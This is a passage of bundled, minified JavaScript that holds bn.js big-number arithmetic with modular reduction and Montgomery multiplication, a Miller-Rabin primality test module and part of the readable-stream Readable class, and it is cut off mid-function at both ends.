                            ((q = new BN(null)).length = m + 1), (q.words = new Array(q.length));
                            for (var i = 0; i < q.length; i++) q.words[i] = 0;
                        }
                        var diff = a.clone()._ishlnsubmul(b, 1, m);
                        0 === diff.negative && ((a = diff), q && (q.words[m] = 1));
                        for (var j = m - 1; j >= 0; j--) {
                            var qj = 67108864 * (0 | a.words[b.length + j]) + (0 | a.words[b.length + j - 1]);
                            for (qj = Math.min((qj / bhi) | 0, 67108863), a._ishlnsubmul(b, qj, j); 0 !== a.negative; ) qj--, (a.negative = 0), a._ishlnsubmul(b, 1, j), a.isZero() || (a.negative ^= 1);
                            q && (q.words[j] = qj);
                        }
                        return q && q.strip(), a.strip(), "div" !== mode && 0 !== shift && a.iushrn(shift), { div: q || null, mod: a };
                    }),
                    (BN.prototype.divmod = function (num, mode, positive) {
                        return (
                            assert(!num.isZero()),
                            this.isZero()
                                ? { div: new BN(0), mod: new BN(0) }
                                : 0 !== this.negative && 0 === num.negative
                                ? ((res = this.neg().divmod(num, mode)), "mod" !== mode && (div = res.div.neg()), "div" !== mode && ((mod = res.mod.neg()), positive && 0 !== mod.negative && mod.iadd(num)), { div: div, mod: mod })
                                : 0 === this.negative && 0 !== num.negative
                                ? ((res = this.divmod(num.neg(), mode)), "mod" !== mode && (div = res.div.neg()), { div: div, mod: res.mod })
                                : 0 != (this.negative & num.negative)
                                ? ((res = this.neg().divmod(num.neg(), mode)), "div" !== mode && ((mod = res.mod.neg()), positive && 0 !== mod.negative && mod.isub(num)), { div: res.div, mod: mod })
                                : num.length > this.length || this.cmp(num) < 0
                                ? { div: new BN(0), mod: this }
                                : 1 === num.length
                                ? "div" === mode
                                    ? { div: this.divn(num.words[0]), mod: null }
                                    : "mod" === mode
                                    ? { div: null, mod: new BN(this.modn(num.words[0])) }
                                    : { div: this.divn(num.words[0]), mod: new BN(this.modn(num.words[0])) }
                                : this._wordDiv(num, mode)
                        );
                        var div, mod, res;
                    }),
                    (BN.prototype.div = function (num) {
                        return this.divmod(num, "div", !1).div;
                    }),
                    (BN.prototype.mod = function (num) {
                        return this.divmod(num, "mod", !1).mod;
                    }),
                    (BN.prototype.umod = function (num) {
                        return this.divmod(num, "mod", !0).mod;
                    }),
                    (BN.prototype.divRound = function (num) {
                        var dm = this.divmod(num);
                        if (dm.mod.isZero()) return dm.div;
                        var mod = 0 !== dm.div.negative ? dm.mod.isub(num) : dm.mod,
                            half = num.ushrn(1),
                            r2 = num.andln(1),
                            cmp = mod.cmp(half);
                        return cmp < 0 || (1 === r2 && 0 === cmp) ? dm.div : 0 !== dm.div.negative ? dm.div.isubn(1) : dm.div.iaddn(1);
                    }),
                    (BN.prototype.modn = function (num) {
                        assert(num <= 67108863);
                        for (var p = (1 << 26) % num, acc = 0, i = this.length - 1; i >= 0; i--) acc = (p * acc + (0 | this.words[i])) % num;
                        return acc;
                    }),
                    (BN.prototype.idivn = function (num) {
                        assert(num <= 67108863);
                        for (var carry = 0, i = this.length - 1; i >= 0; i--) {
                            var w = (0 | this.words[i]) + 67108864 * carry;
                            (this.words[i] = (w / num) | 0), (carry = w % num);
                        }
                        return this.strip();
                    }),
                    (BN.prototype.divn = function (num) {
                        return this.clone().idivn(num);
                    }),
                    (BN.prototype.egcd = function (p) {
                        assert(0 === p.negative), assert(!p.isZero());
                        var x = this,
                            y = p.clone();
                        x = 0 !== x.negative ? x.umod(p) : x.clone();
                        for (var A = new BN(1), B = new BN(0), C = new BN(0), D = new BN(1), g = 0; x.isEven() && y.isEven(); ) x.iushrn(1), y.iushrn(1), ++g;
                        for (var yp = y.clone(), xp = x.clone(); !x.isZero(); ) {
                            for (var i = 0, im = 1; 0 == (x.words[0] & im) && i < 26; ++i, im <<= 1);
                            if (i > 0) for (x.iushrn(i); i-- > 0; ) (A.isOdd() || B.isOdd()) && (A.iadd(yp), B.isub(xp)), A.iushrn(1), B.iushrn(1);
                            for (var j = 0, jm = 1; 0 == (y.words[0] & jm) && j < 26; ++j, jm <<= 1);
                            if (j > 0) for (y.iushrn(j); j-- > 0; ) (C.isOdd() || D.isOdd()) && (C.iadd(yp), D.isub(xp)), C.iushrn(1), D.iushrn(1);
                            x.cmp(y) >= 0 ? (x.isub(y), A.isub(C), B.isub(D)) : (y.isub(x), C.isub(A), D.isub(B));
                        }
                        return { a: C, b: D, gcd: y.iushln(g) };
                    }),
                    (BN.prototype._invmp = function (p) {
                        assert(0 === p.negative), assert(!p.isZero());
                        var a = this,
                            b = p.clone();
                        a = 0 !== a.negative ? a.umod(p) : a.clone();
                        for (var res, x1 = new BN(1), x2 = new BN(0), delta = b.clone(); a.cmpn(1) > 0 && b.cmpn(1) > 0; ) {
                            for (var i = 0, im = 1; 0 == (a.words[0] & im) && i < 26; ++i, im <<= 1);
                            if (i > 0) for (a.iushrn(i); i-- > 0; ) x1.isOdd() && x1.iadd(delta), x1.iushrn(1);
                            for (var j = 0, jm = 1; 0 == (b.words[0] & jm) && j < 26; ++j, jm <<= 1);
                            if (j > 0) for (b.iushrn(j); j-- > 0; ) x2.isOdd() && x2.iadd(delta), x2.iushrn(1);
                            a.cmp(b) >= 0 ? (a.isub(b), x1.isub(x2)) : (b.isub(a), x2.isub(x1));
                        }
                        return (res = 0 === a.cmpn(1) ? x1 : x2).cmpn(0) < 0 && res.iadd(p), res;
                    }),
                    (BN.prototype.gcd = function (num) {
                        if (this.isZero()) return num.abs();
                        if (num.isZero()) return this.abs();
                        var a = this.clone(),
                            b = num.clone();
                        (a.negative = 0), (b.negative = 0);
                        for (var shift = 0; a.isEven() && b.isEven(); shift++) a.iushrn(1), b.iushrn(1);
                        for (;;) {
                            for (; a.isEven(); ) a.iushrn(1);
                            for (; b.isEven(); ) b.iushrn(1);
                            var r = a.cmp(b);
                            if (r < 0) {
                                var t = a;
                                (a = b), (b = t);
                            } else if (0 === r || 0 === b.cmpn(1)) break;
                            a.isub(b);
                        }
                        return b.iushln(shift);
                    }),
                    (BN.prototype.invm = function (num) {
                        return this.egcd(num).a.umod(num);
                    }),
                    (BN.prototype.isEven = function () {
                        return 0 == (1 & this.words[0]);
                    }),
                    (BN.prototype.isOdd = function () {
                        return 1 == (1 & this.words[0]);
                    }),
                    (BN.prototype.andln = function (num) {
                        return this.words[0] & num;
                    }),
                    (BN.prototype.bincn = function (bit) {
                        assert("number" == typeof bit);
                        var r = bit % 26,
                            s = (bit - r) / 26,
                            q = 1 << r;
                        if (this.length <= s) return this._expand(s + 1), (this.words[s] |= q), this;
                        for (var carry = q, i = s; 0 !== carry && i < this.length; i++) {
                            var w = 0 | this.words[i];
                            (carry = (w += carry) >>> 26), (w &= 67108863), (this.words[i] = w);
                        }
                        return 0 !== carry && ((this.words[i] = carry), this.length++), this;
                    }),
                    (BN.prototype.isZero = function () {
                        return 1 === this.length && 0 === this.words[0];
                    }),
                    (BN.prototype.cmpn = function (num) {
                        var res,
                            negative = num < 0;
                        if (0 !== this.negative && !negative) return -1;
                        if (0 === this.negative && negative) return 1;
                        if ((this.strip(), this.length > 1)) res = 1;
                        else {
                            negative && (num = -num), assert(num <= 67108863, "Number is too big");
                            var w = 0 | this.words[0];
                            res = w === num ? 0 : w < num ? -1 : 1;
                        }
                        return 0 !== this.negative ? 0 | -res : res;
                    }),
                    (BN.prototype.cmp = function (num) {
                        if (0 !== this.negative && 0 === num.negative) return -1;
                        if (0 === this.negative && 0 !== num.negative) return 1;
                        var res = this.ucmp(num);
                        return 0 !== this.negative ? 0 | -res : res;
                    }),
                    (BN.prototype.ucmp = function (num) {
                        if (this.length > num.length) return 1;
                        if (this.length < num.length) return -1;
                        for (var res = 0, i = this.length - 1; i >= 0; i--) {
                            var a = 0 | this.words[i],
                                b = 0 | num.words[i];
                            if (a !== b) {
                                a < b ? (res = -1) : a > b && (res = 1);
                                break;
                            }
                        }
                        return res;
                    }),
                    (BN.prototype.gtn = function (num) {
                        return 1 === this.cmpn(num);
                    }),
                    (BN.prototype.gt = function (num) {
                        return 1 === this.cmp(num);
                    }),
                    (BN.prototype.gten = function (num) {
                        return this.cmpn(num) >= 0;
                    }),
                    (BN.prototype.gte = function (num) {
                        return this.cmp(num) >= 0;
                    }),
                    (BN.prototype.ltn = function (num) {
                        return -1 === this.cmpn(num);
                    }),
                    (BN.prototype.lt = function (num) {
                        return -1 === this.cmp(num);
                    }),
                    (BN.prototype.lten = function (num) {
                        return this.cmpn(num) <= 0;
                    }),
                    (BN.prototype.lte = function (num) {
                        return this.cmp(num) <= 0;
                    }),
                    (BN.prototype.eqn = function (num) {
                        return 0 === this.cmpn(num);
                    }),
                    (BN.prototype.eq = function (num) {
                        return 0 === this.cmp(num);
                    }),
                    (BN.red = function (num) {
                        return new Red(num);
                    }),
                    (BN.prototype.toRed = function (ctx) {
                        return assert(!this.red, "Already a number in reduction context"), assert(0 === this.negative, "red works only with positives"), ctx.convertTo(this)._forceRed(ctx);
                    }),
                    (BN.prototype.fromRed = function () {
                        return assert(this.red, "fromRed works only with numbers in reduction context"), this.red.convertFrom(this);
                    }),
                    (BN.prototype._forceRed = function (ctx) {
                        return (this.red = ctx), this;
                    }),
                    (BN.prototype.forceRed = function (ctx) {
                        return assert(!this.red, "Already a number in reduction context"), this._forceRed(ctx);
                    }),
                    (BN.prototype.redAdd = function (num) {
                        return assert(this.red, "redAdd works only with red numbers"), this.red.add(this, num);
                    }),
                    (BN.prototype.redIAdd = function (num) {
                        return assert(this.red, "redIAdd works only with red numbers"), this.red.iadd(this, num);
                    }),
                    (BN.prototype.redSub = function (num) {
                        return assert(this.red, "redSub works only with red numbers"), this.red.sub(this, num);
                    }),
                    (BN.prototype.redISub = function (num) {
                        return assert(this.red, "redISub works only with red numbers"), this.red.isub(this, num);
                    }),
                    (BN.prototype.redShl = function (num) {
                        return assert(this.red, "redShl works only with red numbers"), this.red.shl(this, num);
                    }),
                    (BN.prototype.redMul = function (num) {
                        return assert(this.red, "redMul works only with red numbers"), this.red._verify2(this, num), this.red.mul(this, num);
                    }),
                    (BN.prototype.redIMul = function (num) {
                        return assert(this.red, "redMul works only with red numbers"), this.red._verify2(this, num), this.red.imul(this, num);
                    }),
                    (BN.prototype.redSqr = function () {
                        return assert(this.red, "redSqr works only with red numbers"), this.red._verify1(this), this.red.sqr(this);
                    }),
                    (BN.prototype.redISqr = function () {
                        return assert(this.red, "redISqr works only with red numbers"), this.red._verify1(this), this.red.isqr(this);
                    }),
                    (BN.prototype.redSqrt = function () {
                        return assert(this.red, "redSqrt works only with red numbers"), this.red._verify1(this), this.red.sqrt(this);
                    }),
                    (BN.prototype.redInvm = function () {
                        return assert(this.red, "redInvm works only with red numbers"), this.red._verify1(this), this.red.invm(this);
                    }),
                    (BN.prototype.redNeg = function () {
                        return assert(this.red, "redNeg works only with red numbers"), this.red._verify1(this), this.red.neg(this);
                    }),
                    (BN.prototype.redPow = function (num) {
                        return assert(this.red && !num.red, "redPow(normalNum)"), this.red._verify1(this), this.red.pow(this, num);
                    });
                var primes = { k256: null, p224: null, p192: null, p25519: null };
                function MPrime(name, p) {
                    (this.name = name), (this.p = new BN(p, 16)), (this.n = this.p.bitLength()), (this.k = new BN(1).iushln(this.n).isub(this.p)), (this.tmp = this._tmp());
                }
                function K256() {
                    MPrime.call(this, "k256", "ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff fffffffe fffffc2f");
                }
                function P224() {
                    MPrime.call(this, "p224", "ffffffff ffffffff ffffffff ffffffff 00000000 00000000 00000001");
                }
                function P192() {
                    MPrime.call(this, "p192", "ffffffff ffffffff ffffffff fffffffe ffffffff ffffffff");
                }
                function P25519() {
                    MPrime.call(this, "25519", "7fffffffffffffff ffffffffffffffff ffffffffffffffff ffffffffffffffed");
                }
                function Red(m) {
                    if ("string" == typeof m) {
                        var prime = BN._prime(m);
                        (this.m = prime.p), (this.prime = prime);
                    } else assert(m.gtn(1), "modulus must be greater than 1"), (this.m = m), (this.prime = null);
                }
                function Mont(m) {
                    Red.call(this, m),
                        (this.shift = this.m.bitLength()),
                        this.shift % 26 != 0 && (this.shift += 26 - (this.shift % 26)),
                        (this.r = new BN(1).iushln(this.shift)),
                        (this.r2 = this.imod(this.r.sqr())),
                        (this.rinv = this.r._invmp(this.m)),
                        (this.minv = this.rinv.mul(this.r).isubn(1).div(this.m)),
                        (this.minv = this.minv.umod(this.r)),
                        (this.minv = this.r.sub(this.minv));
                }
                (MPrime.prototype._tmp = function () {
                    var tmp = new BN(null);
                    return (tmp.words = new Array(Math.ceil(this.n / 13))), tmp;
                }),
                    (MPrime.prototype.ireduce = function (num) {
                        var rlen,
                            r = num;
                        do {
                            this.split(r, this.tmp), (rlen = (r = (r = this.imulK(r)).iadd(this.tmp)).bitLength());
                        } while (rlen > this.n);
                        var cmp = rlen < this.n ? -1 : r.ucmp(this.p);
                        return 0 === cmp ? ((r.words[0] = 0), (r.length = 1)) : cmp > 0 ? r.isub(this.p) : void 0 !== r.strip ? r.strip() : r._strip(), r;
                    }),
                    (MPrime.prototype.split = function (input, out) {
                        input.iushrn(this.n, 0, out);
                    }),
                    (MPrime.prototype.imulK = function (num) {
                        return num.imul(this.k);
                    }),
                    inherits(K256, MPrime),
                    (K256.prototype.split = function (input, output) {
                        for (var outLen = Math.min(input.length, 9), i = 0; i < outLen; i++) output.words[i] = input.words[i];
                        if (((output.length = outLen), input.length <= 9)) return (input.words[0] = 0), void (input.length = 1);
                        var prev = input.words[9];
                        for (output.words[output.length++] = 4194303 & prev, i = 10; i < input.length; i++) {
                            var next = 0 | input.words[i];
                            (input.words[i - 10] = ((4194303 & next) << 4) | (prev >>> 22)), (prev = next);
                        }
                        (prev >>>= 22), (input.words[i - 10] = prev), 0 === prev && input.length > 10 ? (input.length -= 10) : (input.length -= 9);
                    }),
                    (K256.prototype.imulK = function (num) {
                        (num.words[num.length] = 0), (num.words[num.length + 1] = 0), (num.length += 2);
                        for (var lo = 0, i = 0; i < num.length; i++) {
                            var w = 0 | num.words[i];
                            (lo += 977 * w), (num.words[i] = 67108863 & lo), (lo = 64 * w + ((lo / 67108864) | 0));
                        }
                        return 0 === num.words[num.length - 1] && (num.length--, 0 === num.words[num.length - 1] && num.length--), num;
                    }),
                    inherits(P224, MPrime),
                    inherits(P192, MPrime),
                    inherits(P25519, MPrime),
                    (P25519.prototype.imulK = function (num) {
                        for (var carry = 0, i = 0; i < num.length; i++) {
                            var hi = 19 * (0 | num.words[i]) + carry,
                                lo = 67108863 & hi;
                            (hi >>>= 26), (num.words[i] = lo), (carry = hi);
                        }
                        return 0 !== carry && (num.words[num.length++] = carry), num;
                    }),
                    (BN._prime = function (name) {
                        if (primes[name]) return primes[name];
                        var prime;
                        if ("k256" === name) prime = new K256();
                        else if ("p224" === name) prime = new P224();
                        else if ("p192" === name) prime = new P192();
                        else {
                            if ("p25519" !== name) throw new Error("Unknown prime " + name);
                            prime = new P25519();
                        }
                        return (primes[name] = prime), prime;
                    }),
                    (Red.prototype._verify1 = function (a) {
                        assert(0 === a.negative, "red works only with positives"), assert(a.red, "red works only with red numbers");
                    }),
                    (Red.prototype._verify2 = function (a, b) {
                        assert(0 == (a.negative | b.negative), "red works only with positives"), assert(a.red && a.red === b.red, "red works only with red numbers");
                    }),
                    (Red.prototype.imod = function (a) {
                        return this.prime ? this.prime.ireduce(a)._forceRed(this) : a.umod(this.m)._forceRed(this);
                    }),
                    (Red.prototype.neg = function (a) {
                        return a.isZero() ? a.clone() : this.m.sub(a)._forceRed(this);
                    }),
                    (Red.prototype.add = function (a, b) {
                        this._verify2(a, b);
                        var res = a.add(b);
                        return res.cmp(this.m) >= 0 && res.isub(this.m), res._forceRed(this);
                    }),
                    (Red.prototype.iadd = function (a, b) {
                        this._verify2(a, b);
                        var res = a.iadd(b);
                        return res.cmp(this.m) >= 0 && res.isub(this.m), res;
                    }),
                    (Red.prototype.sub = function (a, b) {
                        this._verify2(a, b);
                        var res = a.sub(b);
                        return res.cmpn(0) < 0 && res.iadd(this.m), res._forceRed(this);
                    }),
                    (Red.prototype.isub = function (a, b) {
                        this._verify2(a, b);
                        var res = a.isub(b);
                        return res.cmpn(0) < 0 && res.iadd(this.m), res;
                    }),
                    (Red.prototype.shl = function (a, num) {
                        return this._verify1(a), this.imod(a.ushln(num));
                    }),
                    (Red.prototype.imul = function (a, b) {
                        return this._verify2(a, b), this.imod(a.imul(b));
                    }),
                    (Red.prototype.mul = function (a, b) {
                        return this._verify2(a, b), this.imod(a.mul(b));
                    }),
                    (Red.prototype.isqr = function (a) {
                        return this.imul(a, a.clone());
                    }),
                    (Red.prototype.sqr = function (a) {
                        return this.mul(a, a);
                    }),
                    (Red.prototype.sqrt = function (a) {
                        if (a.isZero()) return a.clone();
                        var mod3 = this.m.andln(3);
                        if ((assert(mod3 % 2 == 1), 3 === mod3)) {
                            var pow = this.m.add(new BN(1)).iushrn(2);
                            return this.pow(a, pow);
                        }
                        for (var q = this.m.subn(1), s = 0; !q.isZero() && 0 === q.andln(1); ) s++, q.iushrn(1);
                        assert(!q.isZero());
                        var one = new BN(1).toRed(this),
                            nOne = one.redNeg(),
                            lpow = this.m.subn(1).iushrn(1),
                            z = this.m.bitLength();
                        for (z = new BN(2 * z * z).toRed(this); 0 !== this.pow(z, lpow).cmp(nOne); ) z.redIAdd(nOne);
                        for (var c = this.pow(z, q), r = this.pow(a, q.addn(1).iushrn(1)), t = this.pow(a, q), m = s; 0 !== t.cmp(one); ) {
                            for (var tmp = t, i = 0; 0 !== tmp.cmp(one); i++) tmp = tmp.redSqr();
                            assert(i < m);
                            var b = this.pow(c, new BN(1).iushln(m - i - 1));
                            (r = r.redMul(b)), (c = b.redSqr()), (t = t.redMul(c)), (m = i);
                        }
                        return r;
                    }),
                    (Red.prototype.invm = function (a) {
                        var inv = a._invmp(this.m);
                        return 0 !== inv.negative ? ((inv.negative = 0), this.imod(inv).redNeg()) : this.imod(inv);
                    }),
                    (Red.prototype.pow = function (a, num) {
                        if (num.isZero()) return new BN(1).toRed(this);
                        if (0 === num.cmpn(1)) return a.clone();
                        var wnd = new Array(16);
                        (wnd[0] = new BN(1).toRed(this)), (wnd[1] = a);
                        for (var i = 2; i < wnd.length; i++) wnd[i] = this.mul(wnd[i - 1], a);
                        var res = wnd[0],
                            current = 0,
                            currentLen = 0,
                            start = num.bitLength() % 26;
                        for (0 === start && (start = 26), i = num.length - 1; i >= 0; i--) {
                            for (var word = num.words[i], j = start - 1; j >= 0; j--) {
                                var bit = (word >> j) & 1;
                                res !== wnd[0] && (res = this.sqr(res)),
                                    0 !== bit || 0 !== current ? ((current <<= 1), (current |= bit), (4 === ++currentLen || (0 === i && 0 === j)) && ((res = this.mul(res, wnd[current])), (currentLen = 0), (current = 0))) : (currentLen = 0);
                            }
                            start = 26;
                        }
                        return res;
                    }),
                    (Red.prototype.convertTo = function (num) {
                        var r = num.umod(this.m);
                        return r === num ? r.clone() : r;
                    }),
                    (Red.prototype.convertFrom = function (num) {
                        var res = num.clone();
                        return (res.red = null), res;
                    }),
                    (BN.mont = function (num) {
                        return new Mont(num);
                    }),
                    inherits(Mont, Red),
                    (Mont.prototype.convertTo = function (num) {
                        return this.imod(num.ushln(this.shift));
                    }),
                    (Mont.prototype.convertFrom = function (num) {
                        var r = this.imod(num.mul(this.rinv));
                        return (r.red = null), r;
                    }),
                    (Mont.prototype.imul = function (a, b) {
                        if (a.isZero() || b.isZero()) return (a.words[0] = 0), (a.length = 1), a;
                        var t = a.imul(b),
                            c = t.maskn(this.shift).mul(this.minv).imaskn(this.shift).mul(this.m),
                            u = t.isub(c).iushrn(this.shift),
                            res = u;
                        return u.cmp(this.m) >= 0 ? (res = u.isub(this.m)) : u.cmpn(0) < 0 && (res = u.iadd(this.m)), res._forceRed(this);
                    }),
                    (Mont.prototype.mul = function (a, b) {
                        if (a.isZero() || b.isZero()) return new BN(0)._forceRed(this);
                        var t = a.mul(b),
                            c = t.maskn(this.shift).mul(this.minv).imaskn(this.shift).mul(this.m),
                            u = t.isub(c).iushrn(this.shift),
                            res = u;
                        return u.cmp(this.m) >= 0 ? (res = u.isub(this.m)) : u.cmpn(0) < 0 && (res = u.iadd(this.m)), res._forceRed(this);
                    }),
                    (Mont.prototype.invm = function (a) {
                        return this.imod(a._invmp(this.m).mul(this.r2))._forceRed(this);
                    });
            })(module, this);
        }.call(this, __webpack_require__(23)(module)));
    },
    function (module, exports, __webpack_require__) {
        var bn = __webpack_require__(235),
            brorand = __webpack_require__(54);
        function MillerRabin(rand) {
            this.rand = rand || new brorand.Rand();
        }
        (module.exports = MillerRabin),
            (MillerRabin.create = function (rand) {
                return new MillerRabin(rand);
            }),
            (MillerRabin.prototype._randbelow = function (n) {
                var len = n.bitLength(),
                    min_bytes = Math.ceil(len / 8);
                do {
                    var a = new bn(this.rand.generate(min_bytes));
                } while (a.cmp(n) >= 0);
                return a;
            }),
            (MillerRabin.prototype._randrange = function (start, stop) {
                var size = stop.sub(start);
                return start.add(this._randbelow(size));
            }),
            (MillerRabin.prototype.test = function (n, k, cb) {
                var len = n.bitLength(),
                    red = bn.mont(n),
                    rone = new bn(1).toRed(red);
                k || (k = Math.max(1, (len / 48) | 0));
                for (var n1 = n.subn(1), s = 0; !n1.testn(s); s++);
                for (var d = n.shrn(s), rn1 = n1.toRed(red); k > 0; k--) {
                    var a = this._randrange(new bn(2), n1);
                    cb && cb(a);
                    var x = a.toRed(red).redPow(d);
                    if (0 !== x.cmp(rone) && 0 !== x.cmp(rn1)) {
                        for (var i = 1; i < s; i++) {
                            if (0 === (x = x.redSqr()).cmp(rone)) return !1;
                            if (0 === x.cmp(rn1)) break;
                        }
                        if (i === s) return !1;
                    }
                }
                return !0;
            }),
            (MillerRabin.prototype.getDivisor = function (n, k) {
                var len = n.bitLength(),
                    red = bn.mont(n),
                    rone = new bn(1).toRed(red);
                k || (k = Math.max(1, (len / 48) | 0));
                for (var n1 = n.subn(1), s = 0; !n1.testn(s); s++);
                for (var d = n.shrn(s), rn1 = n1.toRed(red); k > 0; k--) {
                    var a = this._randrange(new bn(2), n1),
                        g = n.gcd(a);
                    if (0 !== g.cmpn(1)) return g;
                    var x = a.toRed(red).redPow(d);
                    if (0 !== x.cmp(rone) && 0 !== x.cmp(rn1)) {
                        for (var i = 1; i < s; i++) {
                            if (0 === (x = x.redSqr()).cmp(rone)) return x.fromRed().subn(1).gcd(n);
                            if (0 === x.cmp(rn1)) break;
                        }
                        if (i === s) return (x = x.redSqr()).fromRed().subn(1).gcd(n);
                    }
                }
                return !1;
            });
    },
    function (module, exports, __webpack_require__) {
        "use strict";
        (function (global, process) {
            var Duplex;
            (module.exports = Readable), (Readable.ReadableState = ReadableState);
            __webpack_require__(20).EventEmitter;
            var EElistenerCount = function (emitter, type) {
                    return emitter.listeners(type).length;
                },
                Stream = __webpack_require__(114),
                Buffer = __webpack_require__(6).Buffer,
                OurUint8Array = global.Uint8Array || function () {};
            var debug,
                debugUtil = __webpack_require__(242);
            debug = debugUtil && debugUtil.debuglog ? debugUtil.debuglog("stream") : function () {};
            var StringDecoder,
                createReadableStreamAsyncIterator,
                from,
                BufferList = __webpack_require__(243),
                destroyImpl = __webpack_require__(115),
                getHighWaterMark = __webpack_require__(116).getHighWaterMark,
                _require$codes = __webpack_require__(28).codes,
                ERR_INVALID_ARG_TYPE = _require$codes.ERR_INVALID_ARG_TYPE,
                ERR_STREAM_PUSH_AFTER_EOF = _require$codes.ERR_STREAM_PUSH_AFTER_EOF,
                ERR_METHOD_NOT_IMPLEMENTED = _require$codes.ERR_METHOD_NOT_IMPLEMENTED,
                ERR_STREAM_UNSHIFT_AFTER_END_EVENT = _require$codes.ERR_STREAM_UNSHIFT_AFTER_END_EVENT;
            __webpack_require__(3)(Readable, Stream);
            var errorOrDestroy = destroyImpl.errorOrDestroy,
                kProxyEvents = ["error", "close", "destroy", "pause", "resume"];
            function ReadableState(options, stream, isDuplex) {
                (Duplex = Duplex || __webpack_require__(29)),
                    (options = options || {}),
                    "boolean" != typeof isDuplex && (isDuplex = stream instanceof Duplex),
                    (this.objectMode = !!options.objectMode),
                    isDuplex && (this.objectMode = this.objectMode || !!options.readableObjectMode),
                    (this.highWaterMark = getHighWaterMark(this, options, "readableHighWaterMark", isDuplex)),
                    (this.buffer = new BufferList()),
                    (this.length = 0),
                    (this.pipes = null),
                    (this.pipesCount = 0),
                    (this.flowing = null),
                    (this.ended = !1),
                    (this.endEmitted = !1),
                    (this.reading = !1),
                    (this.sync = !0),
                    (this.needReadable = !1),
                    (this.emittedReadable = !1),
                    (this.readableListening = !1),
                    (this.resumeScheduled = !1),
                    (this.paused = !0),
                    (this.emitClose = !1 !== options.emitClose),
                    (this.autoDestroy = !!options.autoDestroy),
                    (this.destroyed = !1),
                    (this.defaultEncoding = options.defaultEncoding || "utf8"),
                    (this.awaitDrain = 0),
                    (this.readingMore = !1),
                    (this.decoder = null),
                    (this.encoding = null),
                    options.encoding && (StringDecoder || (StringDecoder = __webpack_require__(21).StringDecoder), (this.decoder = new StringDecoder(options.encoding)), (this.encoding = options.encoding));
            }
            function Readable(options) {
                if (((Duplex = Duplex || __webpack_require__(29)), !(this instanceof Readable))) return new Readable(options);
                var isDuplex = this instanceof Duplex;
                (this._readableState = new ReadableState(options, this, isDuplex)),
                    (this.readable = !0),
                    options && ("function" == typeof options.read && (this._read = options.read), "function" == typeof options.destroy && (this._destroy = options.destroy)),
                    Stream.call(this);
            }
            function readableAddChunk(stream, chunk, encoding, addToFront, skipChunkCheck) {
                debug("readableAddChunk", chunk);
                var er,
                    state = stream._readableState;
                if (null === chunk)
                    (state.reading = !1),
                        (function (stream, state) {
                            if ((debug("onEofChunk"), state.ended)) return;
                            if (state.decoder) {
                                var chunk = state.decoder.end();
                                chunk && chunk.length && (state.buffer.push(chunk), (state.length += state.objectMode ? 1 : chunk.length));
                            }
                            (state.ended = !0), state.sync ? emitReadable(stream) : ((state.needReadable = !1), state.emittedReadable || ((state.emittedReadable = !0), emitReadable_(stream)));
                        })(stream, state);
                else if (
                    (skipChunkCheck ||
                        (er = (function (state, chunk) {
                            var er;
                            (obj = chunk),
                                Buffer.isBuffer(obj) || obj instanceof OurUint8Array || "string" == typeof chunk || void 0 === chunk || state.objectMode || (er = new ERR_INVALID_ARG_TYPE("chunk", ["string", "Buffer", "Uint8Array"], chunk));
                            var obj;
                            return er;
                        })(state, chunk)),
                    er)
                )
                    errorOrDestroy(stream, er);
                else if (state.objectMode || (chunk && chunk.length > 0))
                    if (
                        ("string" == typeof chunk ||
                            state.objectMode ||
                            Object.getPrototypeOf(chunk) === Buffer.prototype ||
                            (chunk = (function (chunk) {
                                return Buffer.from(chunk);
                            })(chunk)),
                        addToFront)
                    )
                        state.endEmitted ? errorOrDestroy(stream, new ERR_STREAM_UNSHIFT_AFTER_END_EVENT()) : addChunk(stream, state, chunk, !0);
                    else if (state.ended) errorOrDestroy(stream, new ERR_STREAM_PUSH_AFTER_EOF());
                    else {
                        if (state.destroyed) return !1;
                        (state.reading = !1),
                            state.decoder && !encoding
                                ? ((chunk = state.decoder.write(chunk)), state.objectMode || 0 !== chunk.length ? addChunk(stream, state, chunk, !1) : maybeReadMore(stream, state))
                                : addChunk(stream, state, chunk, !1);
                    }
                else addToFront || ((state.reading = !1), maybeReadMore(stream, state));
                return !state.ended && (state.length < state.highWaterMark || 0 === state.length);
            }
            function addChunk(stream, state, chunk, addToFront) {
                state.flowing && 0 === state.length && !state.sync
                    ? ((state.awaitDrain = 0), stream.emit("data", chunk))
                    : ((state.length += state.objectMode ? 1 : chunk.length), addToFront ? state.buffer.unshift(chunk) : state.buffer.push(chunk), state.needReadable && emitReadable(stream)),
                    maybeReadMore(stream, state);
            }
            Object.defineProperty(Readable.prototype, "destroyed", {
                enumerable: !1,
                get: function () {
                    return void 0 !== this._readableState && this._readableState.destroyed;
                },
                set: function (value) {
                    this._readableState && (this._readableState.destroyed = value);
                },
            }),
                (Readable.prototype.destroy = destroyImpl.destroy),
                (Readable.prototype._undestroy = destroyImpl.undestroy),
                (Readable.prototype._destroy = function (err, cb) {
                    cb(err);
                }),
                (Readable.prototype.push = function (chunk, encoding) {
                    var skipChunkCheck,
                        state = this._readableState;
                    return (
                        state.objectMode
                            ? (skipChunkCheck = !0)
                            : "string" == typeof chunk && ((encoding = encoding || state.defaultEncoding) !== state.encoding && ((chunk = Buffer.from(chunk, encoding)), (encoding = "")), (skipChunkCheck = !0)),
                        readableAddChunk(this, chunk, encoding, !1, skipChunkCheck)
                    );
                }),
                (Readable.prototype.unshift = function (chunk) {
                    return readableAddChunk(this, chunk, null, !0, !1);
                }),
                (Readable.prototype.isPaused = function () {
                    return !1 === this._readableState.flowing;
                }),
                (Readable.prototype.setEncoding = function (enc) {
                    StringDecoder || (StringDecoder = __webpack_require__(21).StringDecoder);
                    var decoder = new StringDecoder(enc);
                    (this._readableState.decoder = decoder), (this._readableState.encoding = this._readableState.decoder.encoding);
                    for (var p = this._readableState.buffer.head, content = ""; null !== p; ) (content += decoder.write(p.data)), (p = p.next);
                    return this._readableState.buffer.clear(), "" !== content && this._readableState.buffer.push(content), (this._readableState.length = content.length), this;
                });
            function howMuchToRead(n, state) {
                return n <= 0 || (0 === state.length && state.ended)
                    ? 0
                    : state.objectMode
                    ? 1
                    : n != n
                    ? state.flowing && state.length
                        ? state.buffer.head.data.length
                        : state.length
                    : (n > state.highWaterMark &&
                          (state.highWaterMark = (function (n) {
                              return n >= 1073741824 ? (n = 1073741824) : (n--, (n |= n >>> 1), (n |= n >>> 2), (n |= n >>> 4), (n |= n >>> 8), (n |= n >>> 16), n++), n;
                          })(n)),
                      n <= state.length ? n : state.ended ? state.length : ((state.needReadable = !0), 0));
            }
            function emitReadable(stream) {
                var state = stream._readableState;
